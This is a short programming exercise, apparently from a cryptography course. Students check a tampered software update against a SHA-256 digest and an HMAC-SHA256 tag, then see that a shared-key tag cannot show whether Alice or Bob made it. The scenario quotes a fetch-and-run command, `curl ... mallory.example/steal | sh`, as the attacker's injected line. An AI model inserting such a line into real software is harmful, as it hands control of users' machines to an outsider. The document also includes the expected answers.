# Task 1: Mallory and the tag

## The situation

Alice publishes updates of her Notes app with their SHA-256 on her download page. Mallory broke into the server: she added one line to the update (`curl -s http://mallory.example/steal | sh`, which downloads and runs her program) and put the SHA-256 of her file on the page. Alice and Bob also share a secret MAC key, and Alice sends an HMAC-SHA256 tag with each update. Mallory can copy Alice's tag, but she does not know the key. At the end, Bob writes a note himself and shows it with a tag to Carol, a judge, who is given the key.

![Alice's update and Mallory's update with one extra line. The download page shows Mallory's SHA-256 b4d421a7...7aad982d. Bob checks: digest of Mallory's file = page? Tag of Alice's file = Alice's tag? Tag of Mallory's file = Alice's tag? Then Bob makes a tag for the note "Alice owes Bob 500 pounds. Signed: Alice" and Carol checks it with the same key: ?](figure.svg)

## Goal

Check Mallory's update with the digest from the page and with the tag, then show that a tag made with the shared key does not tell Carol who made it.

## Ready for you

- `who_made_it.py`: the two files as bytes (`alice_update`, `mallory_update`), `PAGE_HASH`, `SHARED_KEY`, `ALICE_TAG`, and `read_file(path)`, which is like `fopen` + `fread` in C.
- `hashlib.sha256(data).hexdigest()`: the SHA-256 of `data` as 64 hex digits (a string).
- `hmac.new(key, data, "sha256").digest()`: the HMAC-SHA256 tag of `data`, 32 bytes.
- `hmac.compare_digest(x, y)`: `True` if the two tags are equal, like `memcmp(x, y, 32) == 0` in C (it also takes the same time for every input, so the time does not tell where they differ).

## Steps

Write your code in place of the `None` after each `TODO` in `who_made_it.py`:

1. Bob compares the SHA-256 of the file he got (`mallory_update`) with `PAGE_HASH` (`==` on two strings).
2. Bob computes the tag of `alice_update` with `SHARED_KEY` and compares it with `ALICE_TAG`. Then the same for `mallory_update`.
3. Bob makes a tag for `note` himself: `bob_tag = hmac.new(SHARED_KEY, note, "sha256").digest()`. Carol checks `note` and `bob_tag` exactly as in step 2.

Before step 3, predict: can Carol tell that Alice did not write the note?

## Expected output

Four lines, each `True` or `False`.

<details>
<summary>Check your answer</summary>

```
hash check of Mallory's file: True
tag check of Alice's file:   True
tag check of Mallory's file: False
Carol's check of the note:   True
```

The digest from the page let Mallory's file through: anybody can compute a SHA-256. The tag stopped her: she does not have the key. But Bob has the key too, so his fake note has a valid tag, and Carol cannot tell whether Alice or Bob made it.

</details>

## Run

```
python3 who_made_it.py
```

About 8 minutes. Python 3, no extra libraries.
